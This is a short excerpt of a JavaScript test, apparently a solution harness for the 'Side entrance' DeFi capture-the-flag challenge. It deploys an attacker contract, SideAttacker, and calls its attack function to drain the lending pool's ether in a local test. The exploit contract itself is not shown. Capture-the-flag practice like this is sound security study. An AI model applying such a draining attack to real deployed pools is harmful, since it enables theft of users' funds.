...
describe("[Challenge] Side entrance", function () {
  ...
  it("Exploit", async function () {
    ...
    const SideAttacker = await ethers.getContractFactory(
      "SideAttacker",
      attacker
    );
    this.sideAttacker = await SideAttacker.deploy(this.pool.address);
    await this.sideAttacker.attack(ETHER_IN_POOL);
    // await this.sideAttacker.getMoney();
  });
